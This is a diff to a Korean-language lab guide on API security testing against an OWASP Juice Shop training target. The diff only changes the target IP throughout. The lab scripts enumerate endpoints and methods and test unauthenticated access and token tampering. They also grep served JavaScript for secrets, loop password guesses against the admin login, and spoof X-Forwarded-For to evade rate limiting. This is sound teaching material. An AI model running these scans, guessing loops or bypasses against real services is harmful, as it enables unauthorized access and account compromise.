@@ -130,10 +130,10 @@
 echo "=== API 엔드포인트 탐색 ==="
 
 # HTML/JS에서 API 경로 추출
-MAIN_JS=$(curl -s http://10.20.30.80:3000 | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
+MAIN_JS=$(curl -s http://10.20.40.81:3000 | grep -oE 'src="[^"]*main[^"]*\.js"' | head -1 | sed 's/src="//;s/"//')
 if [ -n "$MAIN_JS" ]; then
   echo "JS에서 발견된 API 경로:"
-  curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -oE '"/api/[^"]*"|"/rest/[^"]*"' | sort -u | head -30  # silent 모드
+  curl -s "http://10.20.40.81:3000/$MAIN_JS" | grep -oE '"/api/[^"]*"|"/rest/[^"]*"' | sort -u | head -30  # silent 모드
 fi
 
 echo ""
@@ -157,7 +157,7 @@ printf "%-45s %-6s %-8s %s\n" "엔드포인트" "code" "size" "분류"
 echo "------------------------------------------------------------------"
 discovered=0
 for ep in "${ENDPOINTS[@]}"; do
-  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" "http://10.20.30.80:3000/$ep")
+  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" "http://10.20.40.81:3000/$ep")
   if [ "$code" != "404" ]; then
     cat=""
     case "$code" in
@@ -224,7 +224,7 @@ test_methods() {
   local ep="$1"
   printf "%-25s" "$ep"
   for method in GET POST PUT DELETE PATCH OPTIONS; do
-    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "http://10.20.30.80:3000$ep")
+    code=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "http://10.20.40.81:3000$ep")
     printf " %-6s" "$code"
   done
   echo
@@ -262,7 +262,7 @@ echo "=== 인증 없는 접근 테스트 ==="
 python3 << 'PYEOF'                                     # Python 스크립트 실행
 import requests
 
-BASE = "http://10.20.30.80:3000"
+BASE = "http://10.20.40.81:3000"
 endpoints = {
     "GET /api/Products": f"{BASE}/api/Products",
     "GET /api/Users": f"{BASE}/api/Users",
@@ -296,7 +296,7 @@ PYEOF
 ### 3.2 토큰 조작 테스트
 
 ```bash
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H 'Content-Type: application/json' \
   -d '{"email":"student@test.com","password":"Test1234!"}' \
   | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
@@ -305,7 +305,7 @@ echo "=== 토큰 조작 5 시나리오 매트릭스 ==="
 test_token() {
   local label="$1" auth="$2"
   read code < <(curl -s -o /tmp/whoami.json -w "%{http_code}" \
-    http://10.20.30.80:3000/rest/user/whoami -H "Authorization: $auth")
+    http://10.20.40.81:3000/rest/user/whoami -H "Authorization: $auth")
   email=$(python3 -c "import json; d=json.load(open('/tmp/whoami.json')); print(d.get('user',{}).get('email','-'))" 2>/dev/null || echo '-')
   printf "  %-30s [%s] email=%s\n" "$label" "$code" "$email"
 }
@@ -347,12 +347,12 @@ test_token "인증 없음"            ""
 # 소스 코드에서 API 키/시크릿 패턴 검색
 echo "=== 소스 코드 내 시크릿 검색 ==="
 if [ -n "$MAIN_JS" ]; then
-  curl -s "http://10.20.30.80:3000/$MAIN_JS" | grep -oiE \
+  curl -s "http://10.20.40.81:3000/$MAIN_JS" | grep -oiE \
     "(api[_-]?key|secret|token|password|auth)['\"]?\s*[:=]\s*['\"][^'\"]{8,}" | head -10
 fi
 
 # HTML에서 시크릿 검색
-curl -s http://10.20.30.80:3000 | grep -oiE \
+curl -s http://10.20.40.81:3000 | grep -oiE \
   "(api[_-]?key|secret|token)['\"]?\s*[:=]\s*['\"][^'\"]{8,}" | head -5
 ```
 
@@ -373,7 +373,7 @@ total_ms=0
 first_429=0
 for i in $(seq 1 30); do
   start=$(date +%s%N)
-  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.40.81:3000/rest/user/login \
     -H 'Content-Type: application/json' \
     -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"wrong$i\"}")
   ms=$(( ($(date +%s%N) - start) / 1000000 ))
@@ -413,7 +413,7 @@ echo "50회 연속 검색 요청:"
 
 blocked=0
 for i in $(seq 1 50); do                               # 반복문 시작
-  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/rest/products/search?q=test$i")
+  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=test$i")
   if [ "$code" = "429" ]; then
     echo "시도 $i: Rate Limited!"
     blocked=1
@@ -432,7 +432,7 @@ fi
 # X-Forwarded-For 헤더로 IP 위장
 echo "=== Rate Limiting 우회 (IP 위장) ==="
 for i in $(seq 1 5); do                                # 반복문 시작
-  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.40.81:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -H "X-Forwarded-For: 1.2.3.$i" \
     -d '{"email":"admin@juice-sh.op","password":"wrong"}')  # 요청 데이터(body)
@@ -457,7 +457,7 @@ PATHS=(
 )
 hits=0
 for path in "${PATHS[@]}"; do
-  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" "http://10.20.30.80:3000/$path")
+  read code size < <(curl -s -o /dev/null -w "%{http_code} %{size_download}" "http://10.20.40.81:3000/$path")
   if [ "$code" != "404" ]; then
     echo "  [$code ${size}B] /$path"
     [ "$code" = "200" ] && hits=$((hits+1))
@@ -492,10 +492,10 @@ echo "공개 문서: $hits / ${#PATHS[@]} 경로"
 > ```bash
 > # OWASP zap 의 OpenAPI add-on
 > docker run -v $(pwd):/zap/wrk owasp/zap2docker-stable zap-api-scan.py \
->   -t http://10.20.30.80:3000/api-docs -f openapi -r api_report.html
+>   -t http://10.20.40.81:3000/api-docs -f openapi -r api_report.html
 >
 > # KiteRunner — REST API discovery
-> kr scan http://10.20.30.80:3000 -w routes-large.kite
+> kr scan http://10.20.40.81:3000 -w routes-large.kite
 > ```
 
 ### 5.2 Swagger 문서가 노출된 경우의 위험
@@ -511,7 +511,7 @@ API 문서가 외부에 노출되면:
 
 ```bash
 # Swagger JSON이 있다면 파싱하여 엔드포인트 추출
-SWAGGER_URL="http://10.20.30.80:3000/swagger.json"
+SWAGGER_URL="http://10.20.40.81:3000/swagger.json"
 result=$(curl -s -o /dev/null -w "%{http_code}" "$SWAGGER_URL")
 
 if [ "$result" = "200" ]; then
@@ -541,13 +541,13 @@ fi
 # API 응답에 불필요한 민감 정보가 포함되는지 확인
 echo "=== 데이터 과다 노출 점검 ==="
 
-TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
 
 # Users API 응답 분석
 echo "=== /api/Users/1 응답 필드 ==="
-curl -s http://10.20.30.80:3000/api/Users/1 \
+curl -s http://10.20.40.81:3000/api/Users/1 \
   -H "Authorization: Bearer $TOKEN" | python3 -c "     # 인증 토큰
 import sys, json
 try:
@@ -564,7 +564,7 @@ except Exception as e:
 
 echo ""
 echo "=== /api/Products/1 응답 필드 ==="
-curl -s http://10.20.30.80:3000/api/Products/1 | python3 -c "  # silent 모드
+curl -s http://10.20.40.81:3000/api/Products/1 | python3 -c "  # silent 모드
 import sys, json
 try:
     data = json.load(sys.stdin).get('data', {})
@@ -587,11 +587,11 @@ test_pagination() {
   has_meta=$(python3 -c "import json; d=json.load(open('/tmp/page.json')); print(any(k in d for k in ['meta','pagination','next','prev','total']))" 2>/dev/null)
   printf "  %-30s code=%s size=%-7s items=%-5s meta=%s\n" "$label" "$code" "${size}B" "$count" "$has_meta"
 }
-test_pagination "/api/Users (전체)"        "http://10.20.30.80:3000/api/Users/"
-test_pagination "/api/Products (전체)"     "http://10.20.30.80:3000/api/Products/"
-test_pagination "/api/Feedbacks (전체)"    "http://10.20.30.80:3000/api/Feedbacks/"
-test_pagination "/api/Challenges (전체)"   "http://10.20.30.80:3000/api/Challenges/"
-test_pagination "/api/SecurityQuestions"   "http://10.20.30.80:3000/api/SecurityQuestions/"
+test_pagination "/api/Users (전체)"        "http://10.20.40.81:3000/api/Users/"
+test_pagination "/api/Products (전체)"     "http://10.20.40.81:3000/api/Products/"
+test_pagination "/api/Feedbacks (전체)"    "http://10.20.40.81:3000/api/Feedbacks/"
+test_pagination "/api/Challenges (전체)"   "http://10.20.40.81:3000/api/Challenges/"
+test_pagination "/api/SecurityQuestions"   "http://10.20.40.81:3000/api/SecurityQuestions/"
 ```
 
 **예상 출력**:
@@ -660,7 +660,7 @@ test_pagination "/api/SecurityQuestions"   "http://10.20.30.80:3000/api/Security
 
 ### Burp Suite Community
 > **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
-> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **실행 위치:** `작업 PC → web (10.20.40.81:3000)`  
 > **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
 
 **주요 경로·파일**
